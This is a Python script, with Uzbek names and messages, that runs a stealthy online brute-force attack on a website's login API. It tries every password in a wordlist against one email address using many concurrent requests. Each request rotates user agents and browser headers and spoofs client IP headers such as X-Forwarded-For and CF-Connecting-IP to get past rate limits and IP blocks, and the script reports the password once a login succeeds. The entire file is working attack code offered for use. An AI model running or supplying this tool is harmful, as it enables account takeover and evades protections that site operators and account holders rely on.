import aiohttp
import asyncio
import argparse
import random
import time

# ==================== USER-AGENT ====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
]

LANGUAGES = [
    "en-US,en;q=0.9", "en-GB,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8",
    "uz-UZ,uz;q=0.9,ru;q=0.8", "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8", "tr-TR,tr;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8",
]

SEC_CH_UA_LIST = [
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="24"',
    '"Chromium";v="125", "Microsoft Edge";v="125", "Not-A.Brand";v="99"',
]


def tasodifiy_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def tasodifiy_headers():
    ua = random.choice(USER_AGENTS)
    ip = tasodifiy_ip()
    headers = {
        "Content-Type": "application/json",
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br",
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "CF-Connecting-IP": ip,
        "True-Client-IP": ip,
    }
    if "Chrome" in ua or "Edg" in ua:
        headers["Sec-CH-UA"] = random.choice(SEC_CH_UA_LIST)
        headers["Sec-CH-UA-Mobile"] = "?0"
        headers["Sec-CH-UA-Platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
        headers["Sec-Fetch-Dest"] = "empty"
        headers["Sec-Fetch-Mode"] = "cors"
        headers["Sec-Fetch-Site"] = "same-origin"
    return headers


# ==================== HISOBLAGICH ====================
class Hisoblagich:
    def __init__(self):
        self.yuborildi = 0
        self.xato_429 = 0
        self.timeout = 0
        self.xato = 0
        self.topildi = False
        self.topilgan_parol = None
        self.lock = asyncio.Lock()
        self.boshlash = time.time()

    async def oshir(self, tur="ok"):
        async with self.lock:
            self.yuborildi += 1
            if tur == "429": self.xato_429 += 1
            elif tur == "timeout": self.timeout += 1
            elif tur == "xato": self.xato += 1
            return self.yuborildi

    def tezlik(self):
        dt = time.time() - self.boshlash
        return self.yuborildi / dt if dt > 0 else 0


# ==================== SOROV ====================
async def bitta_sorov(session, url, email, parol, xato_soz, jami, hisob, sem):
    if hisob.topildi:
        return None

    async with sem:
        if hisob.topildi:
            return None

        data = {"email": email, "password": parol}
        headers = tasodifiy_headers()

        try:
            async with session.post(url, json=data, headers=headers, 
                                     timeout=aiohttp.ClientTimeout(total=5)) as javob:
                status = javob.status
                matni = await javob.text()
                joriy = await hisob.oshir("ok")

                # ====== TOPILDIMI? ======
                togri = False
                if status >= 400:
                    togri = False
                elif xato_soz:
                    if xato_soz.lower() not in matni.lower():
                        togri = True
                else:
                    if status in (200, 301, 302):
                        togri = True

                if togri:
                    hisob.topildi = True
                    hisob.topilgan_parol = parol
                    tez = hisob.tezlik()
                    print(f"\n  {'*'*60}")
                    print(f"  *  PAROL TOPILDI!")
                    print(f"  *")
                    print(f"  *  Email    : {email}")
                    print(f"  *  Password : {parol}")
                    print(f"  *  Status   : {status}")
                    print(f"  *  Urinish  : {joriy}/{jami}")
                    print(f"  *  Tezlik   : {tez:.0f} so'rov/sek")
                    print(f"  *  Vaqt     : {time.time() - hisob.boshlash:.1f}s")
                    print(f"  *")
                    print(f"  *  Javob    : {matni[:300]}")
                    print(f"  {'*'*60}\n")
                    return parol

                # 429
                if status == 429:
                    await hisob.oshir("429")
                    await asyncio.sleep(random.uniform(0.5, 2.0))

                # Har 500-da batafsil statistika
                if joriy % 500 == 0:
                    tez = hisob.tezlik()
                    qolgan = (jami - joriy) / tez if tez > 0 else 0
                    umumiy = time.time() - hisob.boshlash
                    print(f"  [~] {joriy:>6}/{jami} | {tez:.0f} so'rov/s | Qoldi: {qolgan/60:.1f} min | 429: {hisob.xato_429} | T/O: {hisob.timeout} | Vaqt: {umumiy:.0f}s")
                else:
                    ip = headers.get('X-Forwarded-For', '?')
                    print(f"  [-] {joriy:>6}/{jami} | {parol:<35} | Status: {status} | IP: {ip}")

        except asyncio.TimeoutError:
            await hisob.oshir("timeout")
        except aiohttp.ClientError:
            await hisob.oshir("xato")
        except Exception:
            await hisob.oshir("xato")

    return None


async def login_bruteforce(url, email, parol_fayl, xato_soz, concurrency):
    # Parollarni o'qish
    try:
        with open(parol_fayl, 'r', encoding='utf-8') as f:
            parollar = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[XATO] Fayl topilmadi: {parol_fayl}")
        return None

    jami = len(parollar)
    hisob = Hisoblagich()
    sem = asyncio.Semaphore(concurrency)

    print(f"\n{'='*60}")
    print(f"  LOGIN BRUTEFORCE — ASYNC STEALTH")
    print(f"{'='*60}")
    print(f"  URL         : {url}")
    print(f"  Email       : {email}")
    print(f"  Parollar    : {jami} ta")
    print(f"  Concurrency : {concurrency} ta parallel")
    print(f"  Xato so'z   : {xato_soz}")
    print(f"  Timeout     : 5s")
    print(f"  User-Agent  : {len(USER_AGENTS)} xil")
    print(f"{'='*60}\n")

    connector = aiohttp.TCPConnector(
        limit=concurrency,
        limit_per_host=concurrency,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
    )

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            bitta_sorov(session, url, email, parol, xato_soz, jami, hisob, sem)
            for parol in parollar
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    # Statistika
    umumiy = time.time() - hisob.boshlash
    tez = hisob.yuborildi / umumiy if umumiy > 0 else 0

    print(f"\n{'='*60}")
    print(f"  YAKUNIY NATIJA")
    print(f"{'='*60}")
    print(f"  Yuborildi  : {hisob.yuborildi} ta")
    print(f"  Vaqt       : {umumiy:.1f}s ({umumiy/60:.1f} min)")
    print(f"  Tezlik     : {tez:.0f} so'rov/sek")
    print(f"  429 xato   : {hisob.xato_429}")
    print(f"  Timeout    : {hisob.timeout}")
    if hisob.topilgan_parol:
        print(f"  TOPILDI    : {hisob.topilgan_parol}")
    else:
        print(f"  Topilmadi")
    print(f"{'='*60}\n")

    return hisob.topilgan_parol


def main():
    parser = argparse.ArgumentParser(
        description='Login bruteforce — async stealth',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Misol:
  python login_bruteforce.py -u https://sayt.com/api/login -e user@mail.com -p parollar.txt -x "Incorrect"
  python login_bruteforce.py -u https://sayt.com/api/login -e user@mail.com -p parollar.txt -x "Incorrect" -c 50
        """
    )

    parser.add_argument('-u', '--url', required=True, help='Login API URL')
    parser.add_argument('-e', '--email', required=True, help='Email manzil')
    parser.add_argument('-p', '--parollar', required=True, help='Parollar .txt fayli')
    parser.add_argument('-x', '--xato_soz', default='Incorrect', help='Noto\'g\'ri parolda chiqadigan so\'z (standart: Incorrect)')
    parser.add_argument('-c', '--concurrency', type=int, default=30, help='Parallel so\'rovlar soni (standart: 30)')

    args = parser.parse_args()

    asyncio.run(login_bruteforce(args.url, args.email, args.parollar, args.xato_soz, args.concurrency))


if __name__ == '__main__':
    main()
